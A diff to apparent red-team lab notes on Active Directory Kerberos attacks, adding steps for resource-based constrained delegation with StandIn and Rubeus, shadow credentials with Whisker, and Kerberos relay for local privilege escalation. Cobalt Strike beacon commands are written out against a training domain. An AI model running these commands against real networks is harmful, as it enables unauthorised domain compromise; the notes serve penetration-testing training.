@@ -172,7 +172,7 @@ Machines do not get remote local admin access to themselves. Instead abuse S4U2S
     beacon> steal_token 2664
     beacon> ls \\dc-2.dev.cyberbotic.io\c$
 
-## Resource-Based Constrained Delegation
+## Resource-Based Constrained Delegation (RBCD)
 
 Windows 2012 introduced a new type of delegation called resource-based constrained delegation (RBCD), which allows the delegation configuration to be set on the target rather than the source. 
 
@@ -229,5 +229,52 @@ Without local admin, create your own computer object. By default, even domain us
 
     beacon> powershell Get-DomainObject -Identity "DC=dev,DC=cyberbotic,DC=io" -Properties ms-DS-MachineAccountQuota
 
+[StandIn](https://github.com/FuzzySecurity/StandIn),a post-exploit toolkit, has the functionality to create a computer with a random password:
 
+    beacon> execute-assembly StandIn.exe --computer EvilComputer --make
+
+Rubeus hash can take the password and calculate hashes:
+
+    PS C:\Users\Attacker> Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:EvilComputer$ /domain:dev.cyberbotic.io
+
+which can be used with asktgt to obtain a TGT for the fake computer:
+
+    beacon> execute-assembly Rubeus.exe asktgt /user:EvilComputer$ /aes256:7A79... /nowrap
+
+(rest of the attack is the same).
+
+## Shadow Credentials
+
+Kerberos pre-authentication is typically carried out using a symmetric key derived from a client's password, but asym keys are also possible for Initial Authentication (PKINIT). If a PKI solution is in place, such as Active Directory Certificate Services, the domain controllers and domain members exchange their public keys via the appropriate CA (Certificate Trust model). Also Key Trust model, where trust is established based on raw key data, not a certificate. This requires a client to store their key on their own domain object, in an attribute called msDS-KeyCredentialLink. The basis of the "shadow credentials" attack is that if you can write to this attribute on a user or computer object, you can obtain a TGT for that principal. As such, this is a DACL-style abuse as with RBCD.
+
+[Whisker](https://github.com/eladshamir/Whisker) eases exploiting this:
+
+1: List any keys that might already be present for a target -- essential for cleaning up later.
+
+    beacon> execute-assembly Whisker.exe list /target:dc-2$
+
+2: Add a new key pair to the target:
+
+    beacon> execute-assembly Whisker.exe add /target:dc-2$
+
+3: Ask for a TGT using the Rubeus command that Whisker provides:
+
+    beacon> execute-assembly Rubeus.exe asktgt /user:dc-2$ /certificate:MIIJuA... /password:"y52Eh..." /nowrap
+
+Whisker's clear command removes all keys from msDS-KeyCredentialLink. Bad idea if a key was already present; just list the entries again and only remove the one you made:
+
+    beacon> execute-assembly Whisker.exe list /target:dc-2$
+    beacon> execute-assembly Whisker.exe remove /target:dc-2$ /deviceid:58d0c...
+
+## Kerberos Relay Attacks
+
+Can also relay Kerberos authentication in a Windows domain without MitM. One challenge in relaying Kerberos is that service tickets are encrypted with the service's secret key (a ticket for CIFS/HOST-A cannot be relayed to CIFS/HOST-B because HOST-B would be unable to decrypt a ticket that was encrypted for HOST-A). However, in Windows, the service's secret key is derived from the principal associated with its SPN and is not necessarily unique for each service. Most services run as the local SYSTEM, i.e. the computer account in Active Directory. So service tickets for services run on the same host, such as CIFS/HOST-A and HTTP/HOST-A, would be encrypted with the same key.
+
+There's nothing stopping Kerberos authentication being relayed if the attacker can control the SPN. If signing or channel binding are enabled, these attacks are not possible.
+
+[The DCOM Authentication method](https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html) is similar to how the [RemotePotato](https://github.com/antonioCoco/RemotePotato0) exploit works: stand up a local listener and coerce a privileged COM server into connecting to it; capture the subsequent authentication request and relay it somewhere else. The attacker starts a malicious RPC server that forces connecting clients to authenticate to it using Kerberos only, and by using appropriate security bindings, they can specify a completely arbitrary SPN. This forces a service ticket to be generated for a service/SPN that that attacker doesn't control, such as HOST/DC. They then coerce a privileged COM server into connecting to their malicious RPC server, which authenticates and generates the appropriate Kerberos tickets. In this example, the malicious RPC server would receive a KRB_AP_REQ for HOST/DC as the local computer account, which the attacker can relay to LDAP/DC instead. With a valid service ticket for LDAP, they can submit requests to the DC as the computer account to modify the computer object in Active Directory. This opens the door for other attacker primitives like RBCD and shadow credentials in order to achieve the LPE. 
+
+Tools like [KrbRelayUp](https://github.com/ShorSec/KrbRelayUp) automates most of the exploitation steps. 
+
+For the lab, do the steps manually to understand all of the steps in detail and to know how and what to clean-up (which tools often omit). For the relaying, use the original [KrbRelay](https://github.com/cube0x0/KrbRelay); for the LPE, tools we're already familiar with including StandIn, Whisker, and Rubeus. This lesson shows how Kerberos relaying can be used to LPE to SYSTEM on WKSTN-2 as bfarmer.
 
